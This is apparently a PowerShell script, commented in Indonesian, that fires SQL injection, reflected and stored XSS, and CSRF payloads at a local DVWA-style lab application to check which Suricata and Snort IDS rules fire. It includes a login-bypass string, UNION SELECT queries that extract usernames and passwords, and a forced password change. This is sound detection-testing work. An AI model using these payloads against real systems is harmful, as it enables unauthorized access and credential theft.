# Script Testing Payload - PowerShell
# Untuk testing SQLi, XSS, dan CSRF secara otomatis

Write-Host "🔥 DVWA Payload Testing Script" -ForegroundColor Red
Write-Host "================================`n" -ForegroundColor Red

$baseUrl = "http://localhost:8000"

# ========================================
# 1. SQLi Testing - Login Bypass
# ========================================
Write-Host "[1] Testing SQLi - Login Bypass..." -ForegroundColor Yellow

$loginPayload = @{
    username = "admin' OR '1'='1"
    password = "anything"
}

try {
    $response = Invoke-WebRequest -Uri "$baseUrl/login.php" -Method POST -Body $loginPayload -SessionVariable session
    if ($response.StatusCode -eq 200) {
        Write-Host "✅ SQLi Login Bypass: SUCCESS" -ForegroundColor Green
        Write-Host "   Triggered Rules: Suricata 100004, 100006 | Snort 300005, 300006`n" -ForegroundColor Cyan
    }
} catch {
    Write-Host "❌ SQLi Login Bypass: FAILED" -ForegroundColor Red
    Write-Host "   Error: $($_.Exception.Message)`n" -ForegroundColor Red
}

# ========================================
# 2. SQLi Testing - UNION SELECT
# ========================================
Write-Host "[2] Testing SQLi - UNION SELECT..." -ForegroundColor Yellow

$unionPayloads = @(
    "1' OR '1'='1",
    "1' UNION SELECT 1,2,3,4 --",
    "1' UNION SELECT username, password, 3, created_at FROM users --"
)

foreach ($payload in $unionPayloads) {
    $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
    $url = "$baseUrl/sqli.php?search=$encodedPayload"
    
    try {
        $response = Invoke-WebRequest -Uri $url -WebSession $session
        if ($response.StatusCode -eq 200) {
            Write-Host "✅ Payload: $payload" -ForegroundColor Green
            Write-Host "   Triggered Rules: Suricata 100001, 100003, 100007 | Snort 300001, 300002" -ForegroundColor Cyan
        }
    } catch {
        Write-Host "❌ Payload failed: $payload" -ForegroundColor Red
    }
}
Write-Host ""

# ========================================
# 3. XSS Testing - Reflected
# ========================================
Write-Host "[3] Testing XSS - Reflected..." -ForegroundColor Yellow

$xssPayloads = @(
    "<script>alert('XSS')</script>",
    "<img src=x onerror=`"alert('XSS')`">",
    "<svg onload=`"alert('XSS')`">"
)

foreach ($payload in $xssPayloads) {
    $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
    $url = "$baseUrl/xss_reflected.php?name=$encodedPayload"
    
    try {
        $response = Invoke-WebRequest -Uri $url -WebSession $session
        if ($response.Content -like "*$payload*") {
            Write-Host "✅ XSS Reflected: $payload" -ForegroundColor Green
            Write-Host "   Triggered Rules: Suricata 100010, 100012, 100014 | Snort 300010, 300011" -ForegroundColor Cyan
        }
    } catch {
        Write-Host "❌ XSS Reflected failed: $payload" -ForegroundColor Red
    }
}
Write-Host ""

# ========================================
# 4. XSS Testing - Stored
# ========================================
Write-Host "[4] Testing XSS - Stored..." -ForegroundColor Yellow

$storedXssPayload = @{
    comment = "<script>alert('Stored XSS')</script>"
}

try {
    $response = Invoke-WebRequest -Uri "$baseUrl/xss_stored.php" -Method POST -Body $storedXssPayload -WebSession $session
    if ($response.StatusCode -eq 200) {
        Write-Host "✅ XSS Stored: SUCCESS" -ForegroundColor Green
        Write-Host "   Triggered Rules: Suricata 100011, 100013, 100015 | Snort 300012, 300013" -ForegroundColor Cyan
        Write-Host "   Note: Check page to see payload executed`n" -ForegroundColor Yellow
    }
} catch {
    Write-Host "❌ XSS Stored: FAILED" -ForegroundColor Red
    Write-Host "   Error: $($_.Exception.Message)`n" -ForegroundColor Red
}

# ========================================
# 5. CSRF Testing
# ========================================
Write-Host "[5] Testing CSRF - Password Change..." -ForegroundColor Yellow

$csrfPayload = @{
    new_password = "hacked123"
    confirm_password = "hacked123"
}

try {
    $response = Invoke-WebRequest -Uri "$baseUrl/csrf.php" -Method POST -Body $csrfPayload -WebSession $session
    if ($response.StatusCode -eq 200) {
        Write-Host "✅ CSRF Attack: SUCCESS" -ForegroundColor Green
        Write-Host "   Triggered Rules: Suricata 100021 | Snort 300021" -ForegroundColor Cyan
        Write-Host "   Password changed to: hacked123`n" -ForegroundColor Yellow
    }
} catch {
    Write-Host "❌ CSRF Attack: FAILED" -ForegroundColor Red
    Write-Host "   Error: $($_.Exception.Message)`n" -ForegroundColor Red
}

# ========================================
# Summary
# ========================================
Write-Host "`n================================" -ForegroundColor Red
Write-Host "Testing Complete!" -ForegroundColor Green
Write-Host "================================" -ForegroundColor Red
Write-Host "`nCheck your IDS logs for alerts:" -ForegroundColor Yellow
Write-Host "- Suricata: /var/log/suricata/fast.log" -ForegroundColor Cyan
Write-Host "- Snort3: /var/log/snort/alert_fast.txt" -ForegroundColor Cyan
Write-Host "`nFor manual testing, see PAYLOADS.md" -ForegroundColor Yellow
